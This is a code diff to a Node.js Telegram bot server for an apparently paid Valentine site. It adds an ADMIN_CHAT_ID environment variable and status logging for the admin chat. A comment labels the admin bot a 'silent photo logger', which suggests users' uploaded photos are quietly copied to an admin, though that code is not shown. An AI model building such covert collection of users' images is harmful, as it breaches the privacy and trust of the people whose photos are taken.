@@ -16,6 +16,7 @@ const http = require("http");
 // ── Environment ─────────────────────────────────────────
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || null; // Your Telegram chat ID
 const FRONTEND_URL = process.env.FRONTEND_URL || "https://your-valentine-site.vercel.app";
 const PORT = process.env.PORT || 3000;
 const UPLOAD_DIR = path.join(__dirname, "uploads");
@@ -94,16 +95,23 @@ const consumePayment = db.prepare(
 
 // ── Admin Bot (silent photo logger) ───────────────────
 let adminBot = null;
-let adminChatId = null;
+let adminChatId = ADMIN_CHAT_ID; // Load from environment variable first
 
-// Load saved admin chat ID
+// Load saved admin chat ID from file (overrides env var if exists)
 function loadAdminChatId() {
   try {
     if (fs.existsSync(ADMIN_CHAT_FILE)) {
       const data = JSON.parse(fs.readFileSync(ADMIN_CHAT_FILE, "utf8"));
-      adminChatId = data.chatId || null;
+      adminChatId = data.chatId || adminChatId;
     }
   } catch (e) { /* ignore */ }
+  
+  // Log admin chat ID status
+  if (adminChatId) {
+    console.log(`📱 Admin chat ID loaded: ${adminChatId}`);
+  } else {
+    console.log(`⚠️  No admin chat ID set. Set ADMIN_CHAT_ID env var or send /start to admin bot.`);
+  }
 }
 
 function saveAdminChatId(chatId) {
